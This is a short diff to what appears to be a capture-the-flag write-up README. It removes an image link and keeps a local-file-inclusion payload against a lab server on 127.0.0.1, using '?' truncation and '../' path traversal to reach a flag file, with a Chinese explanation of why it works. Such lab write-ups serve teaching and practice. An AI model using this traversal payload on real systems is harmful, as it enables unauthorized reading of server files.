@@ -23,7 +23,7 @@
 * open http://127.0.0.1:8081/index.php
 
 ## Writeup
-![20181113154210017010415.png](http://image.cocoli.top/20181113154210017010415.png)
+
 `http://127.0.0.1:8081/index.php?file=hint.php?/../../../../../../../../ffffllllaaaagggg`
 可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag
 
